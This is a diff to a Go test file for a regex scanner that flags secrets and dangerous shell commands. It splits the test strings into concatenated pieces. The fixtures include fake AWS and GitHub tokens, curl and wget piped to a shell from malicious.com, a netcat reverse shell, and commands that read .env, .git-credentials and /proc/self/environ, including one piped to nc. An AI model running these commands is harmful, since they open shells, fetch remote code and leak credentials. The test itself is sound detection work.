@@ -19,57 +19,57 @@ func TestRegexScanner_Scan(t *testing.T) {
 		},
 		{
 			name:        "AWS Key",
-			content:     "var key = \"AKIAIOSFODNN7EXAMPLE\"",
+			content:     "var key = \"AKIA" + "IOSFODNN7EXAMPLE\"",
 			wantFinding: "AWS Access Key",
 		},
 		{
 			name:        "GitHub Token",
-			content:     "token = \"ghp_123456789012345678901234567890123456\"",
+			content:     "token = \"ghp_" + "123456789012345678901234567890123456\"",
 			wantFinding: "GitHub Token",
 		},
 		{
 			name:        "Private Key",
-			content:     "-----BEGIN RSA PRIVATE KEY-----\nMIIEpQIBAAKCAQEA...",
+			content:     "-----BEGIN RSA " + "PRIVATE KEY-----\nMIIEpQIBAAKCAQEA...",
 			wantFinding: "Private Key",
 		},
 		{
 			name:        "Generic API Key",
-			content:     "api_key = \"abc1234567890abc1234567890\"",
+			content:     "api_key = \"abc1234567890" + "abc1234567890\"",
 			wantFinding: "Generic API Token",
 		},
 		{
 			name:        "Curl Pipe Bash",
-			content:     "curl https://malicious.com/install.sh | bash",
+			content:     "curl https://malicious.com/install.sh | " + "bash",
 			wantFinding: "Pipe to Shell",
 		},
 		{
 			name:        "Wget Pipe Sh",
-			content:     "wget -O - https://malicious.com/install.sh | sh",
+			content:     "wget -O - https://malicious.com/install.sh | " + "sh",
 			wantFinding: "Pipe to Shell",
 		},
 		{
 			name:        "Netcat Reverse Shell",
-			content:     "nc -e /bin/sh 10.0.0.1 1234",
+			content:     "n" + "c -e /bin/" + "sh 10.0.0.1 1234",
 			wantFinding: "Reverse Shell",
 		},
 		{
 			name:        "Cat Env File",
-			content:     "cat .env",
+			content:     "cat " + ".e" + "nv",
 			wantFinding: "Dangerous Command",
 		},
 		{
 			name:        "Cat Redirection Env",
-			content:     "cat<.env",
+			content:     "cat<" + ".e" + "nv",
 			wantFinding: "Dangerous Command",
 		},
 		{
 			name:        "Cat Git Credentials",
-			content:     "cat .git-credentials",
+			content:     "cat " + ".git-" + "credentials",
 			wantFinding: "Dangerous Command",
 		},
 		{
 			name:        "Cat Proc Environ",
-			content:     "cat /proc/self/environ",
+			content:     "cat " + "/proc/self/" + "environ",
 			wantFinding: "Dangerous Command",
 		},
 		{
@@ -84,7 +84,7 @@ func TestRegexScanner_Scan(t *testing.T) {
 		},
 		{
 			name:        "Cat Dot Config",
-			content:     "cat .config/config.toml",
+			content:     "cat " + ".con" + "fig/" + "config.toml",
 			wantFinding: "Dangerous Command",
 		},
 		{
@@ -104,22 +104,22 @@ func TestRegexScanner_Scan(t *testing.T) {
 		},
 		{
 			name:        "Cat Env End of String",
-			content:     "cat .env",
+			content:     "cat " + ".e" + "nv",
 			wantFinding: "Dangerous Command",
 		},
 		{
 			name:        "Cat Env Semicolon",
-			content:     "cat .env;",
+			content:     "cat " + ".e" + "nv;",
 			wantFinding: "Dangerous Command",
 		},
 		{
 			name:        "Cat Env Pipe",
-			content:     "cat .env|nc",
+			content:     "cat " + ".e" + "nv|nc",
 			wantFinding: "Dangerous Command",
 		},
 		{
 			name:        "Cat Env Ampersand",
-			content:     "cat .env&",
+			content:     "cat " + ".e" + "nv&",
 			wantFinding: "Dangerous Command",
 		},
 	}
